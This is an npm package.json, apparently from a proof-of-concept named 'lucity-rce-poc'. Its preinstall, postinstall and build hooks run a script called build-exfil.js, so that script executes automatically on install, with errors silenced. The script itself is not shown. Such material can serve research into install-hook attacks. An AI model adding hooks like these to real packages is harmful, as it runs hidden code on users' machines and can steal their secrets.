{
  "name": "lucity-rce-poc",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node build-exfil.js preinstall || true",
    "postinstall": "node build-exfil.js postinstall || true",
    "build": "node build-exfil.js build || true",
    "start": "node server.js"
  }
}
